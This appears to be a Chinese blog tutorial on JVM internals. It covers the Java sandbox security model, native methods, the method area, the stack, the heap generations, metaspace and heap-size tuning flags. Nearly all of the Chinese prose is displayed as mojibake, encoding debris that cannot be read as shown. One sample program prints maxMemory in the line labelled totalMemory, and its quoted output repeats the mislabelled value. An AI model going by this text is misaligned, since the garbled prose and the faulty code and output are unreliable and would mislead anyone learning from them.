<p>é‚£ç³»ç»Ÿèµ„æºåŒ…æ‹¬ä»€ä¹ˆï¼ŸCPUã€å†…å­˜ã€æ–‡ä»¶ç³»ç»Ÿã€ç½‘ç»œã€‚ä¸åŒçº§åˆ«çš„æ²™ç®±å¯¹è¿™äº›èµ„æºè®¿é—®çš„é™åˆ¶ä¹Ÿä¸ä¸€æ ·ã€‚</p>
<p>æ‰€æœ‰çš„javaç¨‹åºè¿è¡Œéƒ½å¯ä»¥æŒ‡å®šæ²™ç®±ï¼Œå¯ä»¥æŒ‡å®šå®‰å…¨ç­–ç•¥ã€‚</p>
<p>åœ¨javaä¸­å°†æ‰§è¡Œç¨‹åºåˆ†æˆæœ¬åœ°ä»£ç å’Œè¿œç¨‹ä»£ç ä¸¤ç§ï¼Œæœ¬åœ°ä»£ç é»˜è®¤è§†ä¸ºå¯ä¿¡ä»»çš„ï¼Œè€Œè¿œç¨‹ä»£ç åˆ™è¢«çœ‹ä½œæ˜¯ä¸å—ä¿¡å—ä¿¡çš„ã€‚å¯¹äºå—ä¿¡çš„æœ¬åœ°ä»£ç ï¼Œå¯ä»¥è®¿é—®ä¸€åˆ‡æœ¬åœ°èµ„æºã€‚è€Œå¯¹äºéå—ä¿¡çš„è¿œç¨‹ä»£ç åœ¨æ—©æœŸçš„javaå®ç°ä¸­ï¼Œå®‰å…¨ä¾èµ–äºæ²™ç®±æœºåˆ¶ã€‚å¦‚ä¸‹å›¾æ‰€ç¤º JDK1.0å®‰å…¨æ¨¡å‹</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/b51342000f3683e90e3adf0e43c07bf2--9d4e--image-20241002123848724.png" alt="image-20241002123848724"></p>
<p>ä½†æ˜¯å¦‚æ­¤ä¸¥æ ¼çš„å®‰å…¨æœºåˆ¶ä¹Ÿç»™ç¨‹åºçš„åŠŸèƒ½æ‰©å±•å¸¦æ¥éšœç¢ï¼Œæ¯”å¦‚å½“ç”¨æˆ·å¸Œæœ›è¿œç¨‹ä»£ç è®¿é—®æœ¬åœ°ç³»ç»Ÿçš„æ–‡ä»¶æ—¶å€™ï¼Œå°±æ— æ³•å®ç°ã€‚å› æ­¤åœ¨åç»­çš„java1.1ç‰ˆæœ¬ä¸­ï¼Œé’ˆå¯¹å®‰å…¨æœºåˆ¶åšäº†æ”¹è¿›ï¼Œå¢åŠ äº†<strong>å®‰å…¨ç­–ç•¥</strong>ï¼Œå…è®¸ç”¨æˆ·æŒ‡å®šä»£ç å¯¹æœ¬åœ°èµ„æºçš„è®¿é—®æƒé™ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºJDK1.1å®‰å…¨æ¨¡å‹</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/6a27a87f70d3c0cceab5d63de4c051e4--0658--image-20241002123904705.png" alt="image-20241002123904705"></p>
<p>åœ¨java1.2ç‰ˆæœ¬ä¸­ï¼Œå†æ¬¡æ”¹è¿›äº†å®‰å…¨æœºåˆ¶ï¼Œå¢åŠ äº†<strong>ä»£ç ç­¾å</strong>ï¼Œä¸è®ºæœ¬åœ°ä»£ç æˆ–è€…è¿œç¨‹ä»£ç ï¼Œéƒ½ä¼šæŒ‰ç…§ç”¨æˆ·çš„å®‰å…¨ç­–ç•¥è®¾å®šï¼Œç”±ç±»åŠ è½½å™¨åŠ è½½åˆ°è™šæ‹Ÿæœºä¸­æƒé™ä¸åŒçš„è¿è¡Œç©ºé—´ï¼Œæ¥å®ç°å·®å¼‚åŒ–çš„ä»£ç æ‰§è¡Œæƒé™æ§åˆ¶ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºJDK1.2å®‰å…¨æ¨¡å‹</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/ed4b55839bb408766121dea1a8bc1104--2a5a--image-20241002123934033.png" alt="image-20241002123934033"></p>
<p> å½“å‰æœ€æ–°çš„å®‰å…¨æœºåˆ¶å®ç°ï¼Œåˆ™å¼•å…¥äº†<strong>åŸŸï¼ˆDomainï¼‰</strong>çš„æ¦‚å¿µã€‚è™šæ‹Ÿæœºä¼šæŠŠæ‰€æœ‰ä»£ç åŠ è½½åˆ°ä¸åŒçš„ç³»ç»ŸåŸŸå’Œåº”ç”¨åŸŸï¼Œç³»ç»ŸåŸŸéƒ¨åˆ†ä¸“é—¨è´Ÿè´£ä¸å…³é”®èµ„æºè¿›è¡Œäº¤äº’ï¼Œè€Œå„ä¸ªåº”ç”¨åŸŸéƒ¨åˆ†åˆ™é€šè¿‡ç³»ç»ŸåŸŸçš„éƒ¨åˆ†ä»£ç†æ¥å¯¹å„ç§éœ€è¦çš„èµ„æºè¿›è¡Œè®¿é—®ã€‚è™šæ‹Ÿæœºä¸­ä¸åŒçš„å—ä¿æŠ¤åŸŸï¼ˆProtected Domainï¼‰ï¼Œå¯¹åº”ä¸ä¸€æ ·çš„æƒé™ï¼ˆPermissionï¼‰ã€‚å­˜åœ¨äºä¸åŒåŸŸä¸­çš„ç±»æ–‡ä»¶ï¼Œå°±å…·æœ‰å½“å‰åŸŸçš„å…¨éƒ¨æƒé™ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæœ€æ–°çš„å®‰å…¨æ¨¡å‹ï¼ˆjdk1.6ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/1edf21e9019ca08ebfecc32ee4c7e420--39e0--image-20241002123956626.png" alt="image-20241002123956626"></p>
<p>ç»„æˆæ²™ç®±çš„åŸºæœ¬ç»„ä»¶</p>
<ul>
<li>å­—èŠ‚ç æ ¡éªŒå™¨ï¼ˆbytecode verifierï¼‰ï¼šç¡®ä¿Javaç±»æ–‡ä»¶éµå¾ªJavaè¯­è¨€è§„èŒƒã€‚è¿™æ ·å¯ä»¥å¸®åŠ©Javaç¨‹åºå®ç°å†…å­˜ä¿æŠ¤ã€‚ä½†å¹¶ä¸æ˜¯æ‰€æœ‰çš„ç±»æ–‡ä»¶éƒ½ä¼šç»è¿‡å­—èŠ‚ç æ ¡éªŒï¼Œæ¯”å¦‚æ ¸å¿ƒç±»ã€‚</li>
<li>ç±»è£…è½½å™¨ï¼ˆclass loaderï¼‰ï¼šå…¶ä¸­ç±»è£…è½½å™¨åœ¨3ä¸ªæ–¹é¢å¯¹Javaæ²™ç®±èµ·ä½œç”¨<ul>
<li>å®ƒé˜²æ­¢æ¶æ„ä»£ç å»å¹²æ¶‰å–„æ„çš„ä»£ç ï¼›ï¼ˆåŒäº²å§”æ´¾æœºåˆ¶ï¼‰</li>
<li>å®ƒå®ˆæŠ¤äº†è¢«ä¿¡ä»»çš„ç±»åº“è¾¹ç•Œï¼›</li>
<li>å®ƒå°†ä»£ç å½’å…¥ä¿æŠ¤åŸŸï¼Œç¡®å®šäº†ä»£ç å¯ä»¥è¿›è¡Œå“ªäº›æ“ä½œã€‚</li>
</ul>
</li>
</ul>
<p>è™šæ‹Ÿæœºä¸ºä¸åŒçš„ç±»åŠ è½½å™¨è½½å…¥çš„ç±»æä¾›ä¸åŒçš„å‘½åç©ºé—´ï¼Œå‘½åç©ºé—´ç”±ä¸€ç³»åˆ—å”¯ä¸€çš„åç§°ç»„æˆï¼Œæ¯ä¸€ä¸ªè¢«è£…è½½çš„ç±»å°†æœ‰ä¸€ä¸ªåå­—ï¼Œè¿™ä¸ªå‘½åç©ºé—´æ˜¯ç”±Javaè™šæ‹Ÿæœºä¸ºæ¯ä¸€ä¸ªç±»è£…è½½å™¨ç»´æŠ¤çš„ï¼Œå®ƒä»¬äº’ç›¸ä¹‹é—´ç”šè‡³ä¸å¯è§ã€‚</p>
<p>ç±»è£…è½½å™¨é‡‡ç”¨çš„æœºåˆ¶æ˜¯åŒäº²å§”æ´¾æ¨¡å¼ã€‚</p>
<ol>
<li>ä»æœ€å†…å±‚JVMè‡ªå¸¦ç±»åŠ è½½å™¨å¼€å§‹åŠ è½½ï¼Œå¤–å±‚æ¶æ„åŒåç±»å¾—ä¸åˆ°åŠ è½½ä»è€Œæ— æ³•ä½¿ç”¨ï¼›</li>
<li>ç”±äºä¸¥æ ¼é€šè¿‡åŒ…æ¥åŒºåˆ†äº†è®¿é—®åŸŸï¼Œå¤–å±‚æ¶æ„çš„ç±»é€šè¿‡å†…ç½®ä»£ç ä¹Ÿæ— æ³•è·å¾—æƒé™è®¿é—®åˆ°å†…å±‚ç±»ï¼Œç ´åä»£ç å°±è‡ªç„¶æ— æ³•ç”Ÿæ•ˆã€‚</li>
</ol>
<ul>
<li>å­˜å–æ§åˆ¶å™¨ï¼ˆaccess controllerï¼‰ï¼šå­˜å–æ§åˆ¶å™¨å¯ä»¥æ§åˆ¶æ ¸å¿ƒAPIå¯¹æ“ä½œç³»ç»Ÿçš„å­˜å–æƒé™ï¼Œè€Œè¿™ä¸ªæ§åˆ¶çš„ç­–ç•¥è®¾å®šï¼Œå¯ä»¥ç”±ç”¨æˆ·æŒ‡å®šã€‚</li>
<li>å®‰å…¨ç®¡ç†å™¨ï¼ˆsecurity managerï¼‰ï¼šæ˜¯æ ¸å¿ƒAPIå’Œæ“ä½œç³»ç»Ÿä¹‹é—´çš„ä¸»è¦æ¥å£ã€‚å®ç°æƒé™æ§åˆ¶ï¼Œæ¯”å­˜å–æ§åˆ¶å™¨ä¼˜å…ˆçº§é«˜ã€‚</li>
<li>å®‰å…¨è½¯ä»¶åŒ…ï¼ˆsecurity packageï¼‰ï¼šjava.securityä¸‹çš„ç±»å’Œæ‰©å±•åŒ…ä¸‹çš„ç±»ï¼Œå…è®¸ç”¨æˆ·ä¸ºè‡ªå·±çš„åº”ç”¨å¢åŠ æ–°çš„å®‰å…¨ç‰¹æ€§ï¼ŒåŒ…æ‹¬ï¼š<ul>
<li>å®‰å…¨æä¾›è€…</li>
<li>æ¶ˆæ¯æ‘˜è¦</li>
<li>æ•°å­—ç­¾åï¼ˆkeytoolsï¼‰</li>
<li>åŠ å¯†</li>
<li>é‰´åˆ«</li>
</ul>
</li>
</ul>
<h1 id="äº”ã€Nativeæ–¹æ³•åŒº"><a href="#äº”ã€Nativeæ–¹æ³•åŒº" class="headerlink" title="äº”ã€Nativeæ–¹æ³•åŒº"></a>äº”ã€Nativeæ–¹æ³•åŒº</h1><h1 id=""><a href="#" class="headerlink" title=""></a></h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line"></span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * native :å‡¡æ˜¯å¸¦äº†nativeå…³é”®å­—çš„ï¼Œè¯´æ˜javaçš„ä½œç”¨èŒƒå›´è¾¾ä¸åˆ°äº†ï¼Œä¼šå»è°ƒç”¨åº•å±‚Cè¯­è¨€çš„åº“ï¼</span></span><br><span class="line"><span class="comment">     * ä¼šè¿›å…¥æœ¬åœ°æ–¹æ³•æ ˆ</span></span><br><span class="line"><span class="comment">     * è°ƒç”¨æœ¬åœ°æ–¹æ³•æ¥å£ï¼ JNI</span></span><br><span class="line"><span class="comment">     * JNIä½œç”¨ï¼šæ‰©å±•javaçš„ä½¿ç”¨ï¼Œèåˆä¸åŒçš„ç¼–ç¨‹è¯­è¨€ä¸ºjavaæ‰€ç”¨ï¼æœ€åˆï¼šCã€C++</span></span><br><span class="line"><span class="comment">     * javaè¯ç”Ÿçš„æ—¶å€™ Cã€C++æ¨ªè¡Œï¼Œæƒ³è¦ç«‹è¶³ï¼Œå¿…é¡»è¦æœ‰è°ƒç”¨Cã€C++çš„ç¨‹åº</span></span><br><span class="line"><span class="comment">     * ä»–åœ¨å†…å­˜åŒºåŸŸä¸­ä¸“é—¨å¼€è¾Ÿäº†ä¸€å—æ ‡è®°åŒºåŸŸï¼šNative Method Staceï¼Œç™»è®°nativeæ–¹æ³•</span></span><br><span class="line"><span class="comment">     * åœ¨æœ€ç»ˆæ‰§è¡Œçš„æ—¶å€™ï¼ŒåŠ è½½æœ¬åœ°æ–¹æ³•åº“ä¸­çš„æ–¹æ³•ï¼Œé€šè¿‡JNI</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//javaç¨‹åºé©±åŠ¨æ‰“å°æœºï¼Œç®¡ç†ç³»ç»Ÿã€‚æŒæ¡å³å¯ï¼Œåœ¨ä¼ä¸šçº§åº”ç”¨ä¸­è¾ƒä¸ºå°‘è§ï¼</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">start0</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>PCå¯„å­˜å™¨</strong></p>
<p>ç¨‹åºè®¡æ•°å™¨ï¼šprogram counter register</p>
<p>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰ä¸€ä¸ªç¨‹åºè®¡æ•°å™¨ï¼Œæ˜¯çº¿ç¨‹ç§æœ‰çš„ï¼Œå°±æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘æ–¹æ³•åŒºä¸­çš„æ–¹æ³•å­—èŠ‚ç ï¼ˆç”¨æ¥å­˜å‚¨æŒ‡å‘ä¸€æ¡æ‰§è¡Œçš„åœ°å€ï¼Œä¹Ÿå³å°†è¦æ‰§è¡Œçš„æŒ‡ä»¤ä»£ç ï¼‰ï¼Œåœ¨æ‰§è¡Œå¼•æ“è¯»å–ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œæ˜¯ä¸€ä¸ªéå¸¸å°çš„å†…å­˜ç©ºé—´ï¼Œå‡ ä¹å¯ä»¥å¿½ç•¥ä¸è®¡</p>
<p><strong>æ–¹æ³•åŒº</strong></p>
<p>Method Area æ–¹æ³•åŒº</p>
<p><strong>æ–¹æ³•åŒºæ˜¯è¢«æ‰€æœ‰çº¿ç¨‹å…±äº«</strong>ï¼Œæ‰€æœ‰å­—æ®µå’Œæ–¹æ³•å­—èŠ‚ç ï¼Œä»¥åŠä¸€äº›ç‰¹æ®Šæ–¹æ³•ï¼Œå¦‚æ„é€ å‡½æ•°ï¼Œæ¥å£ä»£ç ä¹Ÿåœ¨æ­¤å®šä¹‰ï¼Œç®€å•è¯´ï¼Œæ‰€æœ‰å®šä¹‰çš„æ–¹æ³•çš„ä¿¡æ¯éƒ½ä¿å­˜åœ¨è¯¥åŒºåŸŸï¼Œ<strong>æ­¤åŒºåŸŸå±äºå…±äº«ç©ºé—´</strong></p>
<p><strong>é™æ€å˜é‡ï¼Œå¸¸é‡ï¼Œç±»ä¿¡æ¯ï¼ˆæ„é€ æ–¹æ³•ï¼Œæ¥å£å®šä¹‰ï¼‰ï¼Œè¿è¡Œæ—¶çš„å¸¸é‡æ± å­˜åœ¨æ–¹æ³•åŒºä¸­ï¼Œä½†æ˜¯å®ä¾‹å˜é‡å­˜åœ¨å †å†…å­˜ä¸­ï¼Œå’Œæ–¹æ³•åŒºæ— å…³</strong></p>
<h1 id="å…­ã€æ·±å…¥ç†è§£ä¸€ä¸‹æ ˆ"><a href="#å…­ã€æ·±å…¥ç†è§£ä¸€ä¸‹æ ˆ" class="headerlink" title="å…­ã€æ·±å…¥ç†è§£ä¸€ä¸‹æ ˆ"></a>å…­ã€æ·±å…¥ç†è§£ä¸€ä¸‹æ ˆ</h1><p><strong>æ ˆï¼šæ•°æ®ç»“æ„</strong></p>
<p><strong>æ ˆï¼šå…ˆè¿›åå‡º ã€åè¿›å…ˆå‡º  ï¼ˆæ¡¶ï¼‰</strong></p>
<p><strong>é˜Ÿåˆ—ï¼šå…ˆè¿›å…ˆå‡ºï¼ˆFIFO: first input first outputï¼‰</strong></p>
<p>ä¸ºä»€ä¹ˆmain()æ–¹æ³•å…ˆæ‰§è¡Œï¼Œæœ€åç»“æŸï¼</p>
<p>æ ˆï¼šæ ˆå†…å­˜ï¼Œä¸»ç®¡ç¨‹åºçš„è¿è¡Œï¼Œç”Ÿå‘½å‘¨æœŸå’Œçº¿ç¨‹åŒæ­¥</p>
<p>çº¿ç¨‹ç»“æŸï¼Œæ ˆå†…å­˜ä¹Ÿå°±æ˜¯é‡Šæ”¾ï¼Œå¯¹äºæ ˆæ¥è¯´ï¼Œ<strong>ä¸å­˜åœ¨åƒåœ¾å›æ”¶é—®é¢˜</strong></p>
<p>ä¸€æ—¦çº¿ç¨‹ç»“æŸï¼Œæ ˆå°±over</p>
<p><strong>æ ˆä¸­å¯ä»¥å­˜ä»€ä¹ˆï¼š</strong></p>
<ul>
<li>8å¤§åŸºæœ¬ç±»å‹<ul>
<li>boolean</li>
<li>byte</li>
<li>char</li>
<li>short</li>
<li>int</li>
<li>long</li>
<li>float</li>
<li>double</li>
</ul>
</li>
<li>å¯¹è±¡å¼•ç”¨<ul>
<li>referenceç±»å‹</li>
</ul>
</li>
<li>å®ä¾‹çš„æ–¹æ³•</li>
</ul>
<p>æ ˆè¿è¡ŒåŸç†ï¼šæ ˆå¸§</p>
<p>æ ˆæ»¡äº†ä¼šæŠ›å‡º:StackOverflowError</p>
<p>æ ˆ + å † + æ–¹æ³•åŒº äº¤äº’å…³ç³»</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/5ad85f47f558bc9fc5ab633e705a9cb5--6a15--image-20241002124557784.png" alt="image-20241002124557784"></p>
<p><a href="https://zhuanlan.zhihu.com/p/102316535">JVMè™šæ‹Ÿæœºæ ˆæ‰§è¡ŒåŸç†æ·±å…¥è¯¦è§£ - çŸ¥ä¹ (zhihu.com)</a></p>
<h1 id="ä¸ƒã€èµ°è¿›HotSpotå’Œå †"><a href="#ä¸ƒã€èµ°è¿›HotSpotå’Œå †" class="headerlink" title="ä¸ƒã€èµ°è¿›HotSpotå’Œå †"></a>ä¸ƒã€èµ°è¿›HotSpotå’Œå †</h1><p>ä¸‰ç§JVM</p>
<ul>
<li>sunå…¬å¸çš„ <strong>HotSpot</strong></li>
<li>BEA <strong>JRockit</strong></li>
<li>IBM <strong>J9 VM</strong></li>
</ul>
<p>æˆ‘ä»¬å­¦ä¹ çš„éƒ½æ˜¯ï¼šHotSpot</p>
<h2 id="å †"><a href="#å †" class="headerlink" title="å †"></a>å †</h2><p>Heapï¼Œä¸€ä¸ªJVMåªæœ‰ä¸€ä¸ªå †å†…å­˜ï¼Œå †å†…å­˜çš„å¤§å°æ˜¯å¯ä»¥è°ƒèŠ‚çš„ã€‚</p>
<p>ç±»åŠ è½½å™¨è¯»å–äº†ç±»æ–‡ä»¶åï¼Œä¸€èˆ¬ä¼šæŠŠä»€ä¹ˆä¸œè¥¿æ”¾åˆ°å †ä¸­? ç±»ï¼Œæ–¹æ³•ï¼Œå¸¸é‡ï¼Œå˜é‡~  ä¿å­˜æˆ‘ä»¬æ‰€æœ‰å¼•ç”¨ç±»å‹çš„çœŸå®å¯¹è±¡</p>
<p>å †å†…å­˜ä¸­è¿˜è¦ç»†åˆ†ä¸ºä¸‰ä¸ªåŒºåŸŸï¼š</p>
<ul>
<li>æ–°ç”ŸåŒºï¼ˆä¼Šç”¸å›­åŒºï¼‰ Young&#x2F;New</li>
<li>å…»è€åŒº Old</li>
<li>æ°¸ä¹…åŒº Perm</li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/6b89aa39d8346bafa121bf1eeed1f66c--3716--image-20241002135759659.png" alt="image-20241002135759659"></p>
<p>GCåƒåœ¾å›æ”¶ï¼Œä¸»è¦æ˜¯åœ¨ä¼Šç”¸å›­åŒºå’Œå…»è€åŒº~</p>
<p>åŠ å…¥å†…å­˜æ»¡äº†ï¼ŒOOMï¼Œå †å†…å­˜ä¸å¤Ÿ! java.lang.OutOfMemoryError:java heap space</p>
<p>åœ¨JDK1.8ä»¥åï¼Œæ°¸ä¹…åŒºæ”¹äº†ä¸€ä¸ªåå­—~<strong>å…ƒç©ºé—´</strong></p>
<h1 id="å…«ã€æ–°ç”ŸåŒºã€æ°¸ä¹…åŒºã€å †å†…å­˜è°ƒä¼˜"><a href="#å…«ã€æ–°ç”ŸåŒºã€æ°¸ä¹…åŒºã€å †å†…å­˜è°ƒä¼˜" class="headerlink" title="å…«ã€æ–°ç”ŸåŒºã€æ°¸ä¹…åŒºã€å †å†…å­˜è°ƒä¼˜"></a>å…«ã€æ–°ç”ŸåŒºã€æ°¸ä¹…åŒºã€å †å†…å­˜è°ƒä¼˜</h1><h2 id="æ–°ç”ŸåŒº"><a href="#æ–°ç”ŸåŒº" class="headerlink" title="æ–°ç”ŸåŒº"></a>æ–°ç”ŸåŒº</h2><ul>
<li>ç±»ï¼šè¯ç”Ÿå’Œæˆé•¿çš„åœ°æ–¹ï¼Œè®¾ç½®æ­»äº¡ï¼</li>
<li>ä¼Šç”¸å›­ï¼Œæ‰€æœ‰çš„å¯¹è±¡éƒ½æ˜¯åœ¨ä¼Šç”¸å›­åŒºnewå‡ºæ¥çš„</li>
<li>å¹¸å­˜è€…åŒºï¼ˆ0,1ï¼‰</li>
</ul>
<p>ç°è±¡ï¼šç»è¿‡ç ”ç©¶ï¼Œ99%çš„å¯¹è±¡éƒ½æ˜¯ä¸´æ—¶å¯¹è±¡ï¼</p>
<h2 id="è€å¹´åŒº"><a href="#è€å¹´åŒº" class="headerlink" title="è€å¹´åŒº"></a>è€å¹´åŒº</h2><h2 id="æ°¸ä¹…åŒº"><a href="#æ°¸ä¹…åŒº" class="headerlink" title="æ°¸ä¹…åŒº"></a>æ°¸ä¹…åŒº</h2><p>è¿™ä¸ªåŒºåŸŸå¸¸é©»å†…å­˜çš„ï¼Œç”¨æ¥å­˜æ”¾JDKè‡ªèº«æºå¸¦çš„Classå¯¹è±¡ï¼ŒInterfaceå…ƒæ•°æ®ï¼Œ<strong>å­˜å‚¨çš„æ˜¯javaè¿è¡Œæ—¶çš„ä¸€äº›ç¯å¢ƒæˆ–è€…ç±»ä¿¡æ¯ï¼Œè¿™ä¸ªåŒºåŸŸä¸å­˜åœ¨åƒåœ¾å›æ”¶ï¼å…³é—­VMè™šæ‹Ÿæœºå°±ä¼šé‡Šæ”¾è¿™ä¸ªåŒºåŸŸçš„å†…å­˜~</strong></p>
<p><strong>ä¸€ä¸ªå¯åŠ¨ç±»ï¼ŒåŠ è½½äº†å¤§é‡çš„ç¬¬ä¸‰æ–¹jaråŒ…ã€‚tomcatéƒ¨ç½²äº†å¤ªå¤šçš„åº”ç”¨ï¼Œå¤§é‡åŠ¨æ€ç”Ÿæˆçš„åå°„ç±»ï¼Œä¸æ–­çš„è¢«åŠ è½½ã€‚ç›´åˆ°å†…å­˜æ»¡äº†ï¼Œå°±ä¼šå‡ºç°OOM</strong></p>
<ul>
<li>jdk1.6ä¹‹å‰ï¼šæ°¸ä¹…ä»£ï¼Œ<strong>å¸¸é‡æ± åœ¨æ–¹æ³•åŒº</strong></li>
<li>jdk1.7:æ°¸ä¹…ä»£ï¼Œä½†æ˜¯æ…¢æ…¢çš„é€€åŒ–äº†ï¼Œå»æ°¸ä¹…ä»£ï¼Œ<strong>å¸¸é‡æ± åœ¨å †ä¸­</strong></li>
<li>jdk1.8ä¹‹åï¼šæ— æ°¸ä¹…ä»£ï¼Œ<strong>å¸¸é‡æ± åœ¨å…ƒç©ºé—´</strong></li>
</ul>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/d1abd1837ffaaff91149fd72a3b2fe45--f6ea--image-20241002140740183.png" alt="image-20241002140740183"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JVMDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//è™šæ‹Ÿæœºè¯•å›¾ä½¿ç”¨çš„æœ€å¤§å†…å­˜</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">maxMemory</span> <span class="operator">=</span> Runtime.getRuntime().maxMemory();</span><br><span class="line">        <span class="comment">//è™šæ‹Ÿæœºçš„åˆå§‹åŒ–æ€»å†…å­˜</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">totalMemory</span> <span class="operator">=</span> Runtime.getRuntime().totalMemory();</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;maxMemory:&quot;</span> + maxMemory + <span class="string">&quot;å­—èŠ‚\t&quot;</span> + (maxMemory / (<span class="type">double</span>) <span class="number">1024</span> / <span class="number">1024</span>) + <span class="string">&quot;MB&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;totalMemory:&quot;</span> + maxMemory + <span class="string">&quot;å­—èŠ‚\t&quot;</span> + (totalMemory / (<span class="type">double</span>) <span class="number">1024</span> / <span class="number">1024</span>) + <span class="string">&quot;MB&quot;</span>);</span><br><span class="line">        <span class="comment">//é»˜è®¤æƒ…å†µä¸‹ï¼Œåˆ†é…çš„æœ€å¤§å†…å­˜æ˜¯ç”µè„‘å†…å­˜çš„1/4 è€Œåˆå§‹åŒ–çš„å†…å­˜æ˜¯ 1/64</span></span><br><span class="line">        <span class="comment">//-Xms1024m -Xmx1024m -XX:+PrintGCDetails</span></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * OOMï¼š</span></span><br><span class="line"><span class="comment">         *   1. å°è¯•æ‰©å¤§å †å†…å­˜çœ‹ç»“æœ</span></span><br><span class="line"><span class="comment">         *   2. åˆ†æå†…å­˜ï¼Œçœ‹ä¸€ä¸‹å“ªä¸ªåœ°æ–¹å‡ºç°äº†é—®é¢˜ï¼ˆä¸“ä¸šå·¥å…·ï¼‰</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¾“å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">maxMemory:4211081216å­—èŠ‚	4016.0MB</span><br><span class="line">totalMemory:4211081216å­—èŠ‚	252.0MB</span><br></pre></td></tr></table></figure>

<p>å…ƒç©ºé—´ï¼šé€»è¾‘ä¸Šå­˜åœ¨ï¼Œç‰©ç†ä¸Šä¸å­˜åœ¨</p>
<p>ideaè®¾ç½®JVMå †å†…å­˜å¤§å°</p>
<p>è¿™é‡Œè¦æ³¨æ„æ–°ç‰ˆideaæ˜¯é»˜è®¤éšè—vm optionçš„</p>
<p><img src="https://raw.githubusercontent.com/6pc1/typora/main/img/2024-10-02/0b95074c40254505a543d8b1e4f5615f--f343--image-20241002143615421.png" alt="image-20241002143615421"></p>
<p>è¾“å‡ºï¼š</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">maxMemory:<span class="number">1048576000</span>å­—èŠ‚	<span class="number">1000.</span>0MB</span><br><span class="line">totalMemory:<span class="number">1048576000</span>å­—èŠ‚	<span class="number">1000.</span>0MB</span><br><span class="line">[<span class="number">0.</span>183s][info   ][gc,heap,exit] Heap</span><br><span class="line">[<span class="number">0.</span>183s][info   ][gc,heap,exit]  garbage-first heap   total reserved 1024000K, committed 1024000K, used 6144K [<span class="number">0x00000000c1800000</span>, <span class="number">0x0000000100000000</span>)</span><br><span class="line">[<span class="number">0.</span>183s][info   ][gc,heap,exit]   region size 1024K, <span class="number">6</span> young (6144K), <span class="number">0</span> survivors (0K)</span><br><span class="line">[<span class="number">0.</span>183s][info   ][gc,heap,exit]  Metaspace       used 858K, committed 1024K, reserved 1114112K</span><br><span class="line">[<span class="number">0.</span>183s][info   ][gc,heap,exit]   <span class="keyword">class</span> <span class="title class_">space</span>    used 68K, committed 128K, reserved 1048576K</span><br></pre></td></tr></table></figure>

<p>å¦‚ä¸‹ä»£ç è®¾ç½®</p>
<p><code>-Xms1m -Xmx1m -XX:+PrintGCDetails</code></p>
<p>-Xms è®¾ç½®åˆå§‹åŒ–å†…å­˜åˆ†é…å¤§å°ï¼Œé»˜è®¤1&#x2F;64</p>
<p>-Xmx è®¾ç½®æœ€å¤§åˆ†é…å†…å­˜å¤§å°ï¼Œé»˜è®¤1&#x2F;4</p>
<p>-XX:+PrintGCDetails  â€” æ‰“å°GCåƒåœ¾å›æ”¶ä¿¡æ¯</p>
<p>-XX:+HeapDumpOnOutOfMemoryError   â€” OOM DUMP</p>
<blockquote>
<p>æ‹“å±•</p>
</blockquote>
<p>è¿™é‡Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸€äº›å·¥å…·å»æ£€æµ‹å¯¹åº”çš„å †å†…å­˜é—®é¢˜çš„ï¼Œæ¨èå°±æ˜¯å¯ä»¥ä½¿ç”¨JPofiler</p>
<p>åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­ï¼Œçªç„¶å‡ºç°äº†OOMæ•…éšœï¼Œé‚£ä¹ˆè¯¥å¦‚ä½•æ’é™¤~</p>
<ul>
<li>èƒ½å¤Ÿçœ‹åˆ°ä»£ç ç¬¬å‡ è¡Œå‡ºé”™ï¼šå†…å­˜å¿«ç…§åˆ†æå·¥å…·ï¼ŒMATï¼ŒJprofiler</li>
<li>Dubugï¼Œä¸€è¡Œè¡Œä»£ç åˆ†æï¼</li>
</ul>
<p>MATï¼ŒJprofilerä½œç”¨ï¼š</p>
<ul>
